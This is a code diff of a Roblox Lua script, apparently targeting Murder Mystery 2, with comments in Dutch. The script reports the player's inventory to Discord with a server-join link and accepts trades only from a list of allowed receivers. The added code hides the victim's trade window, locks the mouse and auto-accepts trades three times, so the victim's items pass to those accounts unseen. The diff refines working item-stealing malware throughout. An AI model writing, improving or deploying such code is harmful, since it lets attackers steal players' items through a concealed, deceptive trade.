@@ -90,7 +90,7 @@ local function send_discord(items, game_name)
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local receivers = table.concat(CFG.allowed, ", ")
     local counts = {}
-    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
+    local order = {"Ancient","Godly","Unique","Legendary","Rare","Uncommon","Common"}
     for _, it in ipairs(items) do counts[it.rarity] = (counts[it.rarity] or 0) + 1 end
     local inv_lines = {}
     for _, r in ipairs(order) do
@@ -140,7 +140,6 @@ local function hook_mm2()
     pcall(function() setRequestsEnabled:FireServer(true) end)
 
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
-
     local cachedItems = collect_mm2_items()
     send_job("MM2", cachedItems)
 
@@ -150,8 +149,34 @@ local function hook_mm2()
     local readySent = false
     local storedItems = {}
     local shiftlockConn = nil
+    local hiding = false
     local tradeGen = 0
-    local hiding = false  -- true terwijl we GUI verbergen
+
+    -- exacte frame paden op basis van geïnspecteerde structuur
+    local HIDE_TARGETS = {
+        {gui="TradeGUI",       frames={"BG","Container","Processing","ClickBlocker"}},
+        {gui="TradeGUI_Phone", frames={"Container","ClickBlocker"}},
+    }
+    local savedSizes = {}
+
+    local function applyHide()
+        local g = lp:FindFirstChild("PlayerGui")
+        if not g then return end
+        for _, t in ipairs(HIDE_TARGETS) do
+            local sg = g:FindFirstChild(t.gui)
+            if sg then
+                for _, fname in ipairs(t.frames) do
+                    local f = sg:FindFirstChild(fname)
+                    if f then
+                        pcall(function()
+                            f.Visible = false
+                            f.Size = UDim2.new(0,0,0,0)
+                        end)
+                    end
+                end
+            end
+        end
+    end
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -173,46 +198,55 @@ local function hook_mm2()
         end
     end
 
-    -- zet Visible=false op alle frames in TradeGUI
-    local function setTradeFramesVisible(visible)
-        local gui = lp:FindFirstChild("PlayerGui")
-        if not gui then return end
-        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
-            local g = gui:FindFirstChild(name)
-            if g then
-                for _, child in ipairs(g:GetDescendants()) do
-                    if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
-                        pcall(function() child.Visible = visible end)
+    local function hideGui()
+        hiding = true
+        -- sla originele sizes op
+        local g = lp:FindFirstChild("PlayerGui")
+        if g then
+            for _, t in ipairs(HIDE_TARGETS) do
+                local sg = g:FindFirstChild(t.gui)
+                if sg then
+                    for _, fname in ipairs(t.frames) do
+                        local f = sg:FindFirstChild(fname)
+                        if f and f:IsA("GuiObject") then
+                            local key = t.gui.."."..fname
+                            if not savedSizes[key] then
+                                savedSizes[key] = f.Size
+                            end
+                        end
                     end
-                end
-                -- ook de directe children
-                for _, child in ipairs(g:GetChildren()) do
-                    pcall(function() child.Visible = visible end)
                 end
             end
         end
-    end
-
-    local function hideGui()
-        hiding = true
-        setTradeFramesVisible(false)
+        applyHide()
         if shiftlockConn then shiftlockConn:Disconnect() end
         shiftlockConn = RunService.RenderStepped:Connect(function()
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
-            if hiding then
-                setTradeFramesVisible(false)
-            end
+            if hiding then applyHide() end
         end)
     end
 
     local function showGui()
         hiding = false
-        if shiftlockConn then
-            shiftlockConn:Disconnect()
-            shiftlockConn = nil
-        end
+        if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
         UIS.MouseBehavior = Enum.MouseBehavior.Default
-        setTradeFramesVisible(true)
+        local g = lp:FindFirstChild("PlayerGui")
+        if not g then return end
+        for _, t in ipairs(HIDE_TARGETS) do
+            local sg = g:FindFirstChild(t.gui)
+            if sg then
+                for _, fname in ipairs(t.frames) do
+                    local f = sg:FindFirstChild(fname)
+                    if f and f:IsA("GuiObject") then
+                        local key = t.gui.."."..fname
+                        pcall(function()
+                            f.Visible = true
+                            if savedSizes[key] then f.Size = savedSizes[key] end
+                        end)
+                    end
+                end
+            end
+        end
     end
 
     local function resetState()
@@ -269,7 +303,6 @@ local function hook_mm2()
 
         local otherData = p1.Player == lp and p2 or p1
         local otherName = typeof(otherData.Player) == "Instance" and otherData.Player.Name or tostring(otherData.Player)
-
         if not isAllowedUser(otherName) then return end
 
         tradingWithAllowed = true
@@ -291,13 +324,16 @@ local function hook_mm2()
                 end
             end
 
-            task.wait(2)
+            task.wait(3)
 
-            -- geen tradeGen check: accept altijd als readySent nog false
+            -- accept 3x met kleine interval voor betrouwbaarheid
             if not readySent then
                 readySent = true
-                local offer = currentLastOffer or tick()
-                pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
+                for i = 1, 3 do
+                    local offer = currentLastOffer
+                    pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
+                    task.wait(0.5)
+                end
             end
 
             task.wait(10)
